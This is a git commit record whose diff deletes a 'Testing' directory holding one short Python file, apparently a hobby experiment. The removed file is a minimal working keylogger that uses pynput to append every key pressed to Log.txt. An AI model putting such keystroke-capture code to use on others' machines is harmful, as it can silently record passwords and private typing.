4acfb099c94e800af5389dece24139e05a724688
Hubert Rozmarynowski <51206366+1hubert@users.noreply.github.com>
2022-09-25 16:08:05 +0200

    Delete Testing directory

--- Testing/write keystrokes to file.py
+++
@@ -1,8 +0,0 @@
-from pynput.keyboard import Listener
-
-def writetofile(key):
-    with open("Log.txt", 'a') as f:
-        f.write(str(key))
-
-with Listener(on_press=writetofile) as l:
-    l.join()
